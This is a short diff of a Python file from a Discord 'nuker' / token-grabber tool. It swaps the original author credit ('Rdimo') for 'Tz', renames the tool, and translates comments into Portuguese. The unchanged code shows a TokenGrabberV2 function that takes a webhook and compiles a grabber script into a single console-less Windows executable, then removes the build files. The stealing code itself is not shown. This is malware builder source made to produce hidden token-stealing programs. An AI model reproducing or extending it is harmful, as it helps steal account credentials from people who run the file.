@@ -1,6 +1,6 @@
-# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
+# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
 # Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
-# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).
+# Tz Tools sob a Licença Pública Geral GNU v2 (1991).
 
 import os
 import shutil
@@ -48,7 +48,7 @@ def TokenGrabberV2(WebHook, fileName):
 
     print(f"{Fore.RED}\nCriando {fileName}.exe\n{Fore.RESET}")
     setTitle(f"Criando {fileName}.exe")
-    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
+    #o equivalente a "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
     PyInstaller.__main__.run([
         '%s.py' % fileName,
         '--name=%s' % fileName,
@@ -58,7 +58,7 @@ def TokenGrabberV2(WebHook, fileName):
         '--icon=NONE',
     ])
     try:
-        #clean build files
+        #limpar arquivos de compilação
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
         shutil.rmtree('build')
         shutil.rmtree('dist')
